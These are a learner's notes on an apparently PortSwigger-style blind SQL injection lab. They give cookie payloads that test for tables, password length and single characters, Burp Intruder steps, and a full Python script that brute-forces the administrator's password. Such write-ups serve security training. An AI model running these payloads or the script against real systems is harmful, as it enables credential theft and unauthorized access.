in this lab we had to perform a blind sql inject.

first i tried what i did in all the precious labs, tried url injection but it did not break the page but did not give data or error.

so had to go to burpsuite and fetch the cookie session id and tracking id.

from which tried to add the 'AND 1=1-- to check if injection is possible. it did display welcome back message and it proved injection is poassible

however, there is one thing i noticed in session id we cannot use + after the comment -- becz it means someting else(am i right or wrong? claude) 

then tried the 1=2 querry that did not return the welcome back message so we can confirm that the boolean values are working(true/false) with the response of 'welcome back!' message

now next step, to confirm the 'users' table acutally exists i tried this querry: 'AND (SELECT'X' FROM users LIMIT 1) = 'X'-- (this appends after the tracking id)

SELECT 'x' FROM users — doesn't fetch real data, just returns the letter 'x' for every row in the users table
LIMIT 1 — only return one row, not all rows. Without this, if users table has multiple rows it could cause errors
='x' — checks if the returned value equals 'x'
If users table exists → query returns 'x' → matches 'x' → TRUE → Welcome back
If users table doesn't exist → query fails → FALSE → no Welcome back

So it's basically just a clever way to check "does this table exist?" without needing to see any real data.

now we confirm that administrator exists in the users table so: ' AND (SELECT 'x' FROM users WHERE username='administrator')='x'--

now to check for the length of the password we can run this querry: 'AND (SELECT LENGTH(password) FROM users WHERE username = 'administrator') = 1(here keep trying =2,=3....=n)--
                                              
this gives us the correct 'welcome back' message on 20 length querry, so we can confirm that the length of the password of the admin is 20.(this can be used for manual bruteforce or setting for loop limit in python script)

now there are two ways to find password in this: 1) manual 2) automatic using intruder in brup suit

for manual the querry we can use is:

    'AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username = administrator) = 'a'--

What SUBSTRING does:

SUBSTRING(password, 1, 1) — from the password, starting at position 1, take 1 character
So this asks "is the first character of the password equal to 'a'?"
Welcome back = yes, first char is 'a'
No welcome back = no, try next letter(b,c,......z and 0,1....9)

this takes too much time becz for each 20 letters length we have to run it a-z,0-9 times it is too tidious.

2nd method we can use here is the automatic intruder which can fetch it automatically

to do it using intruder first right click on the packet info in the repeater and select send to intruder.

then fist it will automatically set the position which are auto-detected. first clear it by pressing the clear button at top.

then select the 'AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username = administrator) = 'a'-- querry's 'a'  and press 'Add §' button which is next to clear button. this set the intruder to auto 
change the value of that specific selected character and make sure the 'a' changes to '§a§' this means it is still 'a' but it is selected to change automatically according to querry payload.

now, what values to check for instead of 'a' if it does not work, we have to add all of these values one by one
so in the Payload section left of the packet info in the intruder --> payload configuration --> ADD a in text field then enter. again add b in text field and enter till ....z and 0,,,,9

now next, in the most right of the burpsuit intruder setting there is setting for intruder written in vertical format. select that and in that there is a section called 'grep-match' this section will grep
anything pertcular thing added to match in the responce and in the attack page when the attack is being performed there is a new column which will say 1 if matched so we dont have to manually check each responce for the welcome back message is send back or not.
also without the grep added we can actually see the length cols value change for that perticular response to determine this is the correct output.

in grep match section --> ADD 'Welcome back'

so when ever the welcome back matches it will indicate us

now if we click on attack and perform the attack it did give us the first character which is 'x'. 

now we change the queey in the intruder to: 

      'AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username = administrator) = 'a'--
so we move to position 2 now. 
this was we have to perform this bruteforce attack 20 times total(length of password) to get the password but changing position each time one attack is finished and incrementing the position manually.

HOWEVER, there is another way to do it even easily, one is brupsuit pro which is paid version or we can write a python script to perform all changes automatically for us.

python has an inbuilt library called 'requests' which can be used as a browser to send and recive the data. 

so first to create a python script : nano ~/sqli_brute.py

write this python script into this file

import requests

url = "https://0a5400f904df09b382f4c6840072002b.web-security-academy.net/filter?category=Food"
session = "d8mzyip6wrq1dqnkdgjhkmngjrvfxqur"
tracking_id = "ty9ZTn8iZb6LjizD"
password = ""

for position in range(1, 21):
    for char in "abcdefghijklmnopqrstuvwxyz0123456789":
        cookies = {
            "TrackingId": f"{tracking_id}' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{char}'--",
            "session": session
        }
        response = requests.get(url, cookies=cookies)
        if "Welcome back" in response.text:
            password += char
            print(f"Position {position}: {char} | Password so far: {password}")
            break

print(f"\nFull Password: {password}")

then--> ctrl-X-->Y-->ENTER
to save the file

to create this file we need 2 things from the burpsuit which are 1) native url of the lab(original one with no injection performed on it, it can be found just above packet info in the intruder section)
2) the session id and tracking id

now we just directly run the file by: python3 ~/sqli_brute.py

this automatically runs all possible combinations given and keeps displaying each matched value from each attack and in the end after the for loop ends it prints entire password in one line.
